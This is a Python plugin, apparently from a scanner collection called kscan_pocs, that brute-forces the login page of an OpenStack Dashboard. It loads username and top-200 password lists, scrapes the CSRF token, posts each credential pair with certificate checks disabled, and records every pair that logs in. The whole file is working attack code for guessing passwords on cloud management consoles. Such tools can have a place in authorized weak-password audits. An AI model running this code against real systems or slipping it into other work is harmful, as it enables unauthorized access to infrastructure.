# coding: utf-8
# @Time    : 2020/9/21 7:50
# @Author    : WANSUIYE
# @File    : OpenStackCheck.py
# @Project: kscan_pocs

import requests
import re

from .utils.getFile import get_var_items,genUserPasswd

def get_dict(flag=1):
	user_list = get_var_items('ssh_user.txt')
	passwd_list = get_var_items('top200passwd.txt')

	return genUserPasswd(user_list, passwd_list)

def bf(target,user,passwd,timeout):
	retVal=''
	try:
		url = '{}://{}:{}/dashboard/auth/login/'.format(target[0], target[1], int(target[2]))
		s = requests.session()
		res1 = s.get(url, verify=False, timeout=timeout).text

		csrf_token = re.findall("<input type='hidden' name='csrfmiddlewaretoken' value='(.*)' />", res1)

		if csrf_token:
			csrf_token = csrf_token[0]
		data = {
			'csrfmiddlewaretoken': csrf_token,
			'username': user,
			'password': passwd,
			'fake_email': '',
			'fake_password': '',
			'region': 'default'
		}
		res2 = s.post(url, data=data, verify=False, timeout=timeout)

		if 'login' not in res2.url and res2.status_code == 200:
			retVal = '{}/{}'.format(user, passwd)

	except:
		pass
	return retVal

def check(target,**kwargs):
	timeout = kwargs.get('timeout') or 3
	flag = kwargs.get('flag') or 1
	retVal={'service':'OpenStack Dashboard','status':1,'url':''}

	for user, passwd in get_dict(flag):
		res = bf(target,user,passwd,timeout)
		if res:
			retVal['status'] = 2
			retVal['url'] += res+'\n'

	return retVal